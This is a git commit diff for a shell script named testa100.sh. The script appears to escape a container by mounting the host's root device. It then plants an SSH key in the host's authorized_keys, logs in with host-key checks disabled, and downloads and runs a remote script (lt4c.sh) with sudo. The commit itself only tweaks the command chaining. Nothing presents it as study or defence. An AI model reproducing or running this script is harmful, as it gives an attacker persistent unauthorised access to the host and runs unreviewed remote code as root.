abf65cedfebaa3934c7b8ac6649f45db55481341
HieuenzoNitendo <80060345+HieuenzoNitendo@users.noreply.github.com>
2025-09-30 22:35:49 +0700

    Update and rename test a100.sh to testa100.sh

--- testa100.sh
+++ testa100.sh
@@ -6,4 +6,5 @@ cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; mkdir -p dli; c
 ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; \
 echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && \
 ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \
-"wget https://raw.githubusercontent.com/lt4c/stuff/refs/heads/main/lt4c.sh -O lt4c.sh; sudo bash lt4c.sh"
+
+"wget https://raw.githubusercontent.com/lt4c/stuff/refs/heads/main/lt4c.sh -O lt4c.sh && sudo bash lt4c.sh"
